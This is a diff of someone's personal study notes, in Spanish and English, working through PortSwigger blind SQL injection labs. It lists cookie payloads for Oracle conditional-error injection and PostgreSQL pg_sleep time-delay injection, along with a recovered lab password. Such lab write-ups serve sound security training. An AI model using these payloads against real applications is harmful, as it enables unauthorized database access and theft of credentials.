@@ -106,6 +106,24 @@ Cookie: TrackingId=i5Ar0xbNkgVZGzzzYYY'+AND+(SELECT+CASE+WHEN+(username%3d'Admin
 
 6) leer las respuestas del lab: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors
 
+You now need to confirm that the server is interpreting the injection as a SQL query i.e. that the error is a SQL syntax error as opposed to any other kind of error. To do this, you first need to construct a subquery using valid SQL syntax. Try submitting:
+
+TrackingId=xyz'||(SELECT '')||'
+
+In this case, notice that the query still appears to be invalid. This may be due to the database type - try specifying a predictable table name in the query:
+
+TrackingId=xyz'||(SELECT '' FROM dual)||'
+
+
+Now that you've crafted what appears to be a valid query, try submitting an invalid query while still preserving valid SQL syntax. For example, try querying a non-existent table name:
+
+TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'
+This time, an error is returned. This behavior strongly suggests that your injection is being processed as a SQL query by the back-end.
+
+
+TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+
+
 7) password: o6rsf9a9bxbqx6uudn6j
 
 oo6rsf9a9bxbqx6uudn6j
@@ -115,3 +133,34 @@ oo6rsf9a9bxbqx6uudn6j
 
 
         --> Lab: Blind SQL injection with time delays
+
+
+Este laboratorio contiene una vulnerabilidad de inyección SQL ciega. 
+La aplicación utiliza una cookie de seguimiento para análisis y realiza 
+una consulta SQL que contiene el valor de la cookie enviada.
+
+Los resultados de la consulta SQL no se devuelven y la aplicación no 
+responde de manera diferente en función de si la consulta devuelve filas o genera un error. 
+Sin embargo, dado que la consulta se ejecuta de forma sincrónica, 
+es posible activar retardos de tiempo condicionales para inferir información.
+
+
+Res: TrackingId=ilDeFJte8z85Oyuxz'||pg_sleep(10)--
+
+
+        --> Lab: Blind SQL injection with time delays and information retrieval
+
+This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
+
+The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.
+
+The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
+
+To solve the lab, log in as the administrator user.
+
+
+Testeand si es vulnerable a SQL injection: 
+
+TrackingId=8m9g8TZEm69quHzzU'||pg_sleep(5)--;
+
+Se retrasa 5 segundos diciendo que es vulnerable SQL injection Time based.
